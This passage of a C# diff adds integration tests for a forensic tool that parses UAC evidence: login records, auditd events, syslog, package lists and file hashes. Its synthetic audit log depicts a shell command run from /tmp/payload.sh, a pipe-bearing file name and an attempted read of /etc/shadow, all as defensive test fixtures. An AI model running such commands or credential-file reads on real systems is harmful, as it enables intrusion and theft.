+                    throw new InvalidOperationException("Local last timestamp was incorrectly promoted to UTC.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
+                    StringSplitOptions.RemoveEmptyEntries);
+                string validUtmp = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("utmpdump_[root]var_log_wtmp.txt", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(validUtmp) ||
+                    validUtmp.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid utmpdump source was not marked normalized-source.");
+                string corruptUtmp = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("utmpdump_corrupt.txt", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(corruptUtmp) ||
+                    corruptUtmp.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Corrupt utmpdump source was not retained as indexed-raw.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                Fact started = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacLoginEventNormalizer.SourceName &&
+                    string.Equals(x.Action, "LoginSessionStarted", StringComparison.Ordinal) &&
+                    HasEntity(x, "User", "alice") &&
+                    HasEntity(x, "RemoteIP", "203.0.113.8"));
+                if (started == null || started.Time.Year != 2026 ||
+                    !HasEntity(started, "SessionRecordId", "ts/0"))
+                    throw new InvalidOperationException("Offset-backed login fact was not normalized.");
+
+                Fact local = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacLoginEventNormalizer.SourceName &&
+                    string.Equals(x.Action, "LoginSessionObserved", StringComparison.Ordinal) &&
+                    HasEntity(x, "User", "alice"));
+                if (local == null || local.Time != DateTime.MinValue || !local.FallbackUsed ||
+                    local.ParserNote.IndexOf("no UTC value was invented", StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Local-time provenance guard was not preserved.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC login integration test failed: " + (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_audit_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string auditDir = Path.Combine(dir, "[root]", "var", "log", "audit");
+                Directory.CreateDirectory(auditDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-28 00:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-28 00:00:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-28 00:00:00 +0000 INF Hostname: UAC-AUDIT-01\r\n",
+                    new UTF8Encoding(false));
+
+                File.WriteAllText(Path.Combine(auditDir, "audit.log"),
+                    "type=SYSCALL msg=audit(1700000000.123:42): arch=c000003e syscall=59 success=yes exit=0 items=1 ppid=900 pid=901 auid=1000 uid=1000 euid=0 tty=pts0 ses=7 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"exec-monitor\"\r\n" +
+                    "type=USER_LOGIN msg=audit(1700000001.456:43): pid=111 uid=0 auid=1000 ses=8 msg='op=login acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=client.example addr=198.51.100.7 terminal=/dev/pts/1 res=success'\r\n" +
+                    "type=EXECVE msg=audit(1700000000.123:42): argc=3 a0=2F62696E2F7368 a1=\"-c\" a2=6964\r\n" +
+                    "type=CWD msg=audit(1700000000.123:42): cwd=\"/tmp\"\r\n" +
+                    "type=PATH msg=audit(1700000000.123:42): item=0 name=\"/tmp/payload.sh\" inode=123 dev=08:01 mode=0100755\r\n" +
+                    "type=PATH msg=audit(1700000000.123:42): item=1 name=\"/tmp/pay|load.sh\" inode=124 dev=08:01 mode=0100755\r\n" +
+                    "type=EOE msg=audit(1700000000.123:42):\r\n" +
+                    "type=AVC msg=audit(1700000002.789:44): avc: denied { read open } for pid=901 comm=\"bash\" path=\"/etc/shadow\" scontext=user_u:user_r:user_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(auditDir, "audit.log.corrupt"),
+                    "this is not an audit event\r\n" +
+                    "type=SYSCALL missing-msg-and-event-id\r\n",
+                    new UTF8Encoding(false));
+                using (var compressedFile = new FileStream(
+                    Path.Combine(auditDir, "audit.log.1.gz"), FileMode.Create,
+                    FileAccess.Write, FileShare.None))
+                using (var compressed = new GZipStream(compressedFile, CompressionMode.Compress))
+                using (var writer = new StreamWriter(compressed, new UTF8Encoding(false)))
+                {
+                    writer.WriteLine("type=USER_AUTH msg=audit(1700000003.100:45): pid=112 uid=0 auid=1001 ses=9 msg='op=PAM:authentication acct=\"bob\" exe=\"/usr/sbin/sshd\" hostname=failed.example addr=203.0.113.55 terminal=ssh res=failed'");
+                }
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC audit evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacAuditEventsCsv);
+                if (!File.Exists(csvPath))
+                    throw new InvalidOperationException("UAC audit canonical CSV was not created.");
+                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
+                Dictionary<string, string> exec = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
+                        "1700000000.123:42", StringComparison.Ordinal));
+                if (exec == null)
+                    throw new InvalidOperationException("Compound EXECVE audit event was not emitted.");
+                if (!string.Equals(CorrelationCsvHelper.Get(exec, "Action"),
+                        "ProcessExecutionObserved", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(exec, "CommandLine"),
+                        "/bin/sh -c id", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(exec, "WorkingDirectory"),
+                        "/tmp", StringComparison.Ordinal) ||
+                    CorrelationCsvHelper.Get(exec, "TargetPaths").IndexOf(
+                        "/tmp/payload.sh", StringComparison.Ordinal) < 0 ||
+                    CorrelationCsvHelper.Get(exec, "TargetPaths").IndexOf(
+                        "/tmp/pay\\|load.sh", StringComparison.Ordinal) < 0 ||
+                    CorrelationCsvHelper.Get(exec, "RecordTypes").IndexOf(
+                        "EXECVE", StringComparison.Ordinal) < 0 ||
+                    !string.Equals(CorrelationCsvHelper.Get(exec, "TimeUtc"),
+                        "2023-11-14T22:13:20.1230000Z", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Compound audit fields were not merged: " +
+                        string.Join(" | ", exec.Select(x => x.Key + "=" + x.Value).ToArray()));
+
+                Dictionary<string, string> login = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
+                        "1700000001.456:43", StringComparison.Ordinal));
+                if (login == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(login, "Action"),
+                        "LoginSucceeded", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(login, "User"),
+                        "alice", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(login, "RemoteAddress"),
+                        "198.51.100.7", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Nested USER_LOGIN fields were not normalized.");
+
+                Dictionary<string, string> avc = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
+                        "1700000002.789:44", StringComparison.Ordinal));
+                if (avc == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(avc, "Action"),
+                        "AccessControlDecisionObserved", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(avc, "SELinuxDecision"),
+                        "denied", StringComparison.Ordinal) ||
+                    CorrelationCsvHelper.Get(avc, "TargetPaths").IndexOf(
+                        "/etc/shadow", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("SELinux AVC event was not normalized.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
+                    StringSplitOptions.RemoveEmptyEntries);
+                string validAudit = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("audit.log\"", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(validAudit) ||
+                    validAudit.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid audit log was not marked normalized-source.");
+                string corruptAudit = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("audit.log.corrupt", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(corruptAudit) ||
+                    corruptAudit.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Malformed audit log was not retained as indexed-raw.");
+                string compressedAudit = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("audit.log.1.gz", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(compressedAudit) ||
+                    compressedAudit.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid gzip audit log was not marked normalized-source.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                Fact execFact = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacAuditEventNormalizer.SourceName &&
+                    string.Equals(x.Action, "ProcessExecutionObserved", StringComparison.Ordinal) &&
+                    HasEntity(x, "AuditEventId", "1700000000.123:42"));
+                if (execFact == null ||
+                    !HasEntity(execFact, "Path", "/usr/bin/bash") ||
+                    !HasEntity(execFact, "Path", "/tmp/payload.sh") ||
+                    !HasEntity(execFact, "Path", "/tmp/pay|load.sh") ||
+                    !HasEntity(execFact, "AuditUserId", "1000") ||
+                    !HasEntity(execFact, "ParentProcessId", "900"))
+                    throw new InvalidOperationException("Audit execution fact entities were incomplete.");
+
+                Fact loginFact = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacAuditEventNormalizer.SourceName &&
+                    string.Equals(x.Action, "LoginSucceeded", StringComparison.Ordinal) &&
+                    HasEntity(x, "User", "alice") &&
+                    HasEntity(x, "RemoteIP", "198.51.100.7"));
+                if (loginFact == null || loginFact.Time.Year != 2023)
+                    throw new InvalidOperationException("Audit login fact was not emitted with event time.");
+                Fact failedAuthFact = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacAuditEventNormalizer.SourceName &&
+                    string.Equals(x.Action, "AuthenticationFailed", StringComparison.Ordinal) &&
+                    HasEntity(x, "User", "bob") &&
+                    HasEntity(x, "RemoteIP", "203.0.113.55"));
+                if (failedAuthFact == null)
+                    throw new InvalidOperationException("Compressed audit authentication fact was not emitted.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC audit integration test failed: " +
+                    (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_syslog_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string linuxLogDir = Path.Combine(dir, "[root]", "var", "log");
+                string macLogDir = Path.Combine(dir, "[root]", "private", "var", "log");
+                Directory.CreateDirectory(linuxLogDir);
+                Directory.CreateDirectory(macLogDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-SYSLOG-01\r\n",
+                    new UTF8Encoding(false));
+
+                File.WriteAllText(Path.Combine(linuxLogDir, "syslog"),
+                    "<34>1 2026-07-28T01:02:03.123456+00:00 host1 sshd 123 ID47 [exampleSDID@32473 iut=\"3\" eventSource=\"Application\"] Accepted publickey for alice\r\n" +
+                    "2026-07-28T09:02:05+08:00 host1 app[77]: completed task\r\n" +
+                    "<13>Jul 28 09:02:04 host1 kernel[42]: device attached\r\n" +
+                    "2026-07-28T09:02:07+08:00 host1 longmsg[88]: " +
+                    new string('x', 5000) + "\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(macLogDir, "system.log"),
+                    "Jul 28 09:03:04 mac1 loginwindow[100] <Notice>: session opened\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(linuxLogDir, "kern.log.bad"),
+                    "this line has no supported timestamp or syslog envelope\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(linuxLogDir, "auth.log"),
+                    "Jul 28 09:04:05 host1 sshd[222]: Accepted publickey for bob from 203.0.113.10 port 22 ssh2\r\n",
+                    new UTF8Encoding(false));
+                using (var compressedFile = new FileStream(
+                    Path.Combine(linuxLogDir, "messages.1.gz"), FileMode.Create,
+                    FileAccess.Write, FileShare.None))
+                using (var compressed = new GZipStream(compressedFile, CompressionMode.Compress))
+                using (var writer = new StreamWriter(compressed, new UTF8Encoding(false)))
+                {
+                    writer.WriteLine("<30>1 2026-07-28T01:02:06Z host1 daemon 55 MSG - service ready");
+                }
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC system-log evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacSystemLogEventsCsv);
+                if (!File.Exists(csvPath))
+                    throw new InvalidOperationException("UAC system-log canonical CSV was not created.");
+                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
+                if (rows.Count != 6)
+                    throw new InvalidOperationException("Unexpected system-log row count: " +
+                        rows.Count.ToString(CultureInfo.InvariantCulture));
+
+                Dictionary<string, string> rfc5424 = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "MessageId"), "ID47",
+                        StringComparison.Ordinal));
+                if (rfc5424 == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "TimeUtc"),
+                        "2026-07-28T01:02:03.1234560Z", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "Facility"),
+                        "auth", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "Severity"),
+                        "crit", StringComparison.Ordinal) ||
+                    CorrelationCsvHelper.Get(rfc5424, "Details").IndexOf(
+                        "structured_data=", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("RFC5424 fields were not normalized.");
+
+                Dictionary<string, string> iso = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "app",
+                        StringComparison.Ordinal));
+                if (iso == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(iso, "TimeUtc"),
+                        "2026-07-28T01:02:05.0000000Z", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(iso, "ProcessId"),
+                        "77", StringComparison.Ordinal))
+                    throw new InvalidOperationException("ISO system-log fields were not normalized.");
+
+                Dictionary<string, string> truncated = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "longmsg",
+                        StringComparison.Ordinal));
+                if (truncated == null ||
+                    CorrelationCsvHelper.Get(truncated, "Message").Length != 4096 ||
+                    CorrelationCsvHelper.Get(truncated, "Details").IndexOf(
+                        "message_truncated=true", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Long system-log message was not bounded with provenance.");
+
+                Dictionary<string, string> yearless = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "kernel",
+                        StringComparison.Ordinal));
+                if (yearless == null ||
+                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(yearless, "TimeUtc")) ||
+                    !string.Equals(CorrelationCsvHelper.Get(yearless, "TimeParseStatus"),
+                        "local-time-year-and-offset-unavailable", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(yearless, "Facility"),
+                        "user", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(yearless, "Severity"),
+                        "notice", StringComparison.Ordinal))
+                    throw new InvalidOperationException("RFC3164 time/PRI safeguards were not preserved.");
+
+                if (rows.Any(x => CorrelationCsvHelper.Get(x, "SourcePath").IndexOf(
+                    "auth.log", StringComparison.OrdinalIgnoreCase) >= 0))
+                    throw new InvalidOperationException("auth.log was duplicated into generic system-log rows.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
+                    StringSplitOptions.RemoveEmptyEntries);
+                string validSyslog = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("/syslog\"", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(validSyslog) ||
+                    validSyslog.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid syslog was not marked normalized-source.");
+                string compressedLog = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("messages.1.gz", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(compressedLog) ||
+                    compressedLog.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid gzip system log was not marked normalized-source.");
+                string corruptLog = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("kern.log.bad", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(corruptLog) ||
+                    corruptLog.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Unsupported system-log lines were not retained as indexed-raw.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                Fact timed = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacSystemLogNormalizer.SourceName &&
+                    HasEntity(x, "ProgramName", "sshd") &&
+                    HasEntity(x, "ProcessId", "123") &&
+                    HasEntity(x, "Computer", "host1"));
+                if (timed == null || timed.Time.Year != 2026 ||
+                    timed.Details.IndexOf("Accepted publickey", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Timed system-log fact was not emitted.");
+
+                Fact untimed = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacSystemLogNormalizer.SourceName &&
+                    HasEntity(x, "ProgramName", "kernel"));
+                if (untimed == null || untimed.Time != DateTime.MinValue ||
+                    !untimed.FallbackUsed ||
+                    untimed.ParserNote.IndexOf("no UTC value was invented",
+                        StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Yearless system-log fact invented a timeline time.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC system-log integration test failed: " +
+                    (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_packages_" +
+                Guid.NewGuid().ToString("N"));
+            string untimedDir = Path.Combine(Path.GetTempPath(), "ircol_uac_packages_untimed_" +
+                Guid.NewGuid().ToString("N"));
+            try
+            {
+                string packages = Path.Combine(dir, "live_response", "packages");
+                Directory.CreateDirectory(packages);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-PACKAGES-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "dpkg_-l.txt"),
+                    "Desired=Unknown/Install/Remove/Purge/Hold\r\n" +
+                    "||/ Name Version Architecture Description\r\n" +
+                    "+++-==================-==================-============-================\r\n" +
+                    "ii  openssh-server 1:9.2p1-2+deb12u5 amd64 " +
+                    new string('d', 3000) + "\r\n" +
+                    "rc  telnet 0.17-41 amd64 legacy client\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages,
+                    "rpm_-q_-a_--queryformat_installtime_name_version_release.txt"),
+                    "1722140000~bash~5.2.26-3.el9\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "dnf_list_installed.txt"),
+                    "Installed Packages\r\n" +
+                    "Warning: repository metadata is stale\r\n" +
+                    "audit.x86_64 3.1.5-1.el9 @System\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "pacman_-Q_-m.txt"),
+                    "custom-agent 1.2.3-1\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "apk_info_-vv.txt"),
+                    "busybox-1.36.1-r2 - Size optimized toolbox\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "flatpak_list.txt"),
+                    "Name\tApplication ID\tVersion\tBranch\tInstallation\r\n" +
+                    "Calculator\torg.gnome.Calculator\t46.0\tstable\tsystem\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages, "snap_list.txt"),
+                    "Name Version Rev Tracking Publisher Notes\r\n" +
+                    "core22 20240111 1122 latest/stable canonical** base\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(packages,
+                    "brew_list_--versions_--multiple.txt"),
+                    "wget 1.21.4 1.21.3\r\n",
+                    new UTF8Encoding(false));
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC package evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPackagesCsv);
+                if (!File.Exists(csvPath))
+                    throw new InvalidOperationException("UAC package canonical CSV was not created.");
+                List<Dictionary<string, string>> rows =
+                    CorrelationCsvHelper.ReadCsv(csvPath);
+                if (rows.Count != 10)
+                    throw new InvalidOperationException("Unexpected UAC package row count: " +
+                        rows.Count.ToString(CultureInfo.InvariantCulture));
+
+                Dictionary<string, string> dpkg = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Name"),
+                        "openssh-server", StringComparison.Ordinal));
+                if (dpkg == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "State"),
+                        "installed", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "Architecture"),
+                        "amd64", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "ObservedAtUtc"),
+                        "2026-07-28T02:00:00.0000000Z", StringComparison.Ordinal) ||
+                    CorrelationCsvHelper.Get(dpkg, "Description").Length != 2048 ||
+                    CorrelationCsvHelper.Get(dpkg, "Details").IndexOf(
+                        "canonical_field_truncated=true", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("dpkg package fields were not normalized.");
+
+                Dictionary<string, string> removed = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Name"),
+                        "telnet", StringComparison.Ordinal));
+                if (removed == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(removed, "State"),
+                        "removed-config-remains", StringComparison.Ordinal))
+                    throw new InvalidOperationException("dpkg non-installed state was collapsed into installed.");
+
+                Dictionary<string, string> rpm = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
+                        "rpm", StringComparison.Ordinal));
+                if (rpm == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(rpm, "InstallTimeUtc"),
+                        "2024-07-28T04:13:20.0000000Z", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(rpm, "InstallTimeParseStatus"),
+                        "epoch-parsed", StringComparison.Ordinal))
+                    throw new InvalidOperationException("RPM install epoch was not preserved.");
+
+                Dictionary<string, string> dnf = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
+                        "dnf", StringComparison.Ordinal));
+                if (dnf == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(dnf, "Name"),
+                        "audit", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(dnf, "Architecture"),
+                        "x86_64", StringComparison.Ordinal))
+                    throw new InvalidOperationException("DNF name/architecture was not normalized.");
+
+                Dictionary<string, string> flatpak = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
+                        "flatpak", StringComparison.Ordinal));
+                if (flatpak == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(flatpak, "Name"),
+                        "org.gnome.Calculator", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(flatpak, "Scope"),
+                        "system", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Flatpak application identity was not normalized.");
+
+                if (rows.Count(x => string.Equals(
+                    CorrelationCsvHelper.Get(x, "Manager"), "brew",
+                    StringComparison.Ordinal)) != 2)
+                    throw new InvalidOperationException("Multiple Homebrew versions were not preserved.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c,
+                    ArtifactNames.UacEvidenceIndexCsv));
+                string dpkgEvidence = evidenceIndex.Split(new string[] {
+                    "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
+                    .FirstOrDefault(x => x.IndexOf("dpkg_-l.txt",
+                        StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(dpkgEvidence) ||
+                    dpkgEvidence.IndexOf("\"normalized-source\"",
+                        StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Package sources were not indexed as normalized.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                List<Fact> packageFacts = store.Facts.Where(x =>
+                    x.Source == UacPackageNormalizer.SourceName).ToList();
+                if (packageFacts.Count != 10)
+                    throw new InvalidOperationException("Unexpected UAC package fact count.");
+
+                Fact rpmFact = packageFacts.FirstOrDefault(x =>
+                    HasEntity(x, "ProductName", "bash") &&
+                    HasEntity(x, "ProductVersion", "5.2.26-3.el9") &&
+                    HasEntity(x, "PackageManager", "rpm"));
+                if (rpmFact == null ||
+                    rpmFact.Action != "PackageInstallTimeRecorded" ||
+                    rpmFact.TimeKind != FactTimeMetadata.MetadataTimeKind ||
+                    rpmFact.Time.Year != 2024)
+                    throw new InvalidOperationException("RPM package fact time semantics were not preserved.");
+
+                Fact observedFact = packageFacts.FirstOrDefault(x =>
+                    HasEntity(x, "ProductName", "openssh-server"));
+                if (observedFact == null ||
+                    observedFact.Action != "PackageStateObserved" ||
+                    observedFact.TimeKind != FactTimeMetadata.ObservedTimeKind ||
+                    observedFact.TimeConfidence != FactTimeMetadata.LowConfidence ||
+                    observedFact.ParserNote.IndexOf("does not imply maliciousness",
+                        StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Package state observation semantics were not preserved.");
+
+                string untimedPackages = Path.Combine(untimedDir,
+                    "live_response", "packages");
+                Directory.CreateDirectory(untimedPackages);
+                File.WriteAllText(Path.Combine(untimedDir, "uac.log"),
+                    "2026-07-28 10:00:00 INF Unix-like Artifacts Collector\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(untimedPackages, "pacman_-Q_-n.txt"),
+                    "bash 5.2.037-1\r\n", new UTF8Encoding(false));
+                CaseData untimedCase = CaseManager.LoadCaseFromFolder(untimedDir);
+                Fact untimedFact = FactStore.BuildFromCase(untimedCase).Facts.FirstOrDefault(x =>
+                    x.Source == UacPackageNormalizer.SourceName);
+                if (untimedFact == null || untimedFact.Time != DateTime.MinValue ||
+                    !untimedFact.FallbackUsed)
+                    throw new InvalidOperationException("Offset-less UAC time was invented for package state.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC package integration test failed: " +
+                    (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+                TryDeleteDir(untimedDir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_hashes_" +
+                Guid.NewGuid().ToString("N"));
+            try
+            {
+                string executableDir = Path.Combine(dir, "hash_executables");
+                string processDir = Path.Combine(dir, "live_response", "process");
+                Directory.CreateDirectory(executableDir);
+                Directory.CreateDirectory(processDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-29 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-29 10:00:00 +0800 INF Operating system: linux\r\n" +
+                    "2026-07-29 10:00:00 +0800 INF Hostname: UAC-HASH-01\r\n",
+                    new UTF8Encoding(false));
+
+                string sha256A = new string('A', 64);
+                string sha256B = new string('b', 64);
+                string sha256C = new string('c', 64);
+                string sha256D = new string('2', 64);
+                string md5A = new string('d', 32);
+                string md5B = new string('e', 32);
+                string sha1A = new string('f', 40);
+                string executableHashes = Path.Combine(executableDir,
+                    "hash_executables.sha256");
+                File.WriteAllText(executableHashes,
+                    sha256A + "  /usr/bin/bash\r\n" +
+                    "SHA256 (/Applications/Evil Tool) = " + sha256B + "\r\n" +
